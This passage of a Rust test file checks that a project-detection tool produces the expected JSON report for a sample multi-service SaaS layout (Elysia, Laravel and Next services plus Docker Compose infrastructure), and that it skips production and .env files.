        assert!(contents.contains_key(path), "{path} was not read");
    }
    for path in contents.keys() {
        assert!(
            !path.contains("dokploy") && !path.contains("prod"),
            "{path} was read"
        );
        assert!(!path.contains(".env"), "{path} was read");
    }
}

#[test]
fn the_acme_saas_layout_produces_the_full_report() {
    let report = acme_saas().detect();
    let actual = serde_json::to_value(&report).expect("serializes");
    let expected = json!({
      "version": 1,
      "services": [
        {
          "name": "acme-backend",
          "root": "acme-backend",
          "kind": "backend",
          "confidence": "high",
          "framework": { "value": "elysia", "confidence": "high", "evidence": ["acme-backend/package.json dependencies.elysia"] },
          "package_manager": { "value": "bun", "confidence": "high", "evidence": ["acme-backend/bun.lock"] },
          "start": { "value": "bun run dev", "confidence": "high", "evidence": ["acme-backend/package.json scripts.dev: bun run --watch src/index.ts"] },
          "port": { "value": 3001, "confidence": "high", "evidence": ["acme-backend/src/config/env.ts:3 PORT || '3001'"] },
          "ready_path": { "value": "/health", "confidence": "high", "evidence": ["acme-backend/src/app.ts:5 .get('/health'"] },
          "ready_url": "http://localhost:3001/health",
          "also_in_compose": null
        },
        {
          "name": "acme-billing",
          "root": "acme-billing",
          "kind": "backend",
          "confidence": "medium",
          "framework": { "value": "laravel", "confidence": "high", "evidence": ["acme-billing/artisan", "acme-billing/composer.json require.laravel/framework"] },
          "package_manager": null,
          "start": { "value": "php artisan serve --port 8000", "confidence": "high", "evidence": ["laravel local dev server", "docker-compose.yml service laravel builds acme-billing"] },
          "port": { "value": 8000, "confidence": "medium", "evidence": ["laravel default port 8000"] },
          "ready_path": { "value": "/api/health", "confidence": "high", "evidence": ["acme-billing/routes/api.php:5 Route::get('/health'"] },
          "ready_url": "http://localhost:8000/api/health",
          "also_in_compose": "laravel"
        },
        {
          "name": "acme-frontend",
          "root": "acme-frontend",
          "kind": "frontend",
          "confidence": "medium",
          "framework": { "value": "next", "confidence": "high", "evidence": ["acme-frontend/package.json dependencies.next", "acme-frontend/next.config.ts"] },
          "package_manager": { "value": "bun", "confidence": "medium", "evidence": ["acme-frontend: bun.lock and package-lock.json; using bun"] },
          "start": { "value": "bun run dev", "confidence": "high", "evidence": ["acme-frontend/package.json scripts.dev: next dev"] },
          "port": { "value": 3000, "confidence": "medium", "evidence": ["next default port 3000"] },
          "ready_path": { "value": "/", "confidence": "high", "evidence": ["frontend"] },
          "ready_url": "http://localhost:3000/",
          "also_in_compose": null
        }
      ],
      "skipped": [
        { "root": "acme-tracker", "reason": "no supported manifest (build.gradle)" }
      ],
      "compose": {
        "file": "docker-compose.yml",
        "services": [
          { "name": "postgres", "image": "postgres:16-alpine", "build": null, "ports": [{ "published": 5433, "target": 5432 }], "role": "infra" },
          { "name": "redis", "image": "redis:7-alpine", "build": null, "ports": [{ "published": 6380, "target": 6379 }], "role": "infra" },
          { "name": "traccar-db", "image": "timescale/timescaledb:latest-pg16", "build": null, "ports": [], "role": "infra" },
          { "name": "traccar", "image": "traccar/traccar:latest", "build": null, "ports": [{ "published": 8082, "target": 8082 }, { "published": 5055, "target": 5055 }], "role": "infra" },
          { "name": "laravel", "image": null, "build": "acme-billing", "ports": [], "role": "native" },
          { "name": "nginx", "image": "nginx:alpine", "build": null, "ports": [{ "published": 8500, "target": 80 }], "role": "other" },
          { "name": "queue", "image": null, "build": "acme-billing", "ports": [], "role": "native" },
          { "name": "mailpit", "image": "axllent/mailpit", "build": null, "ports": [{ "published": 1125, "target": 1025 }, { "published": 8525, "target": 8025 }], "role": "infra" }
        ],
        "start": {
          "value": "docker compose -f docker-compose.yml up -d --wait postgres redis traccar-db traccar mailpit",
          "confidence": "high",
          "evidence": [
            "docker-compose.yml services postgres, redis, traccar-db, traccar, mailpit",
            "docker-compose.yml service traccar depends only on infrastructure (traccar-db)"
          ]
        },
        "stop": { "value": "docker compose -f docker-compose.yml down", "confidence": "high", "evidence": ["docker-compose.yml"] }
      },
      "ignored_compose_files": [
        { "file": "acme-backend/docker-compose.dokploy.yml", "reason": "production compose file (dokploy)" },
        { "file": "acme-billing/docker-compose.dokploy-supabase.yml", "reason": "production compose file (dokploy)" },
        { "file": "acme-billing/docker-compose.dokploy.yml", "reason": "production compose file (dokploy)" },
        { "file": "acme-billing/docker-compose.prod.yml", "reason": "production compose file (prod)" },
        { "file": "acme-frontend/docker-compose.dokploy.yml", "reason": "production compose file (dokploy)" }
      ],
      "base_url": { "value": "http://localhost:3000", "confidence": "medium", "evidence": ["first frontend service acme-frontend"] },
      "ready_path": { "value": "/", "confidence": "high", "evidence": ["acme-frontend ready path"] },
      "target_shape": "services",
      "notes": [
        "acme-billing/docker-compose.yml service nginx: port \"${APP_PORT:-8000}:80\" is not readable",
        "compose service nginx (nginx:alpine) is not started by default",
        "compose service queue also builds acme-billing, which runs natively as laravel; it is not started (command: php artisan queue:work redis --sleep=3 --tries=3 --max-time=3600): add a [[services]] entry if the app needs it",
        "acme-billing/docker-compose.supabase.yml has infrastructure but docker-compose.yml is used",
        "acme-billing/docker-compose.yml has infrastructure but docker-compose.yml is used"
      ]
    });
    if actual != expected {
        panic!(
            "report differs:\n{}",
            serde_json::to_string_pretty(&actual).expect("prints")
        );
    }
}
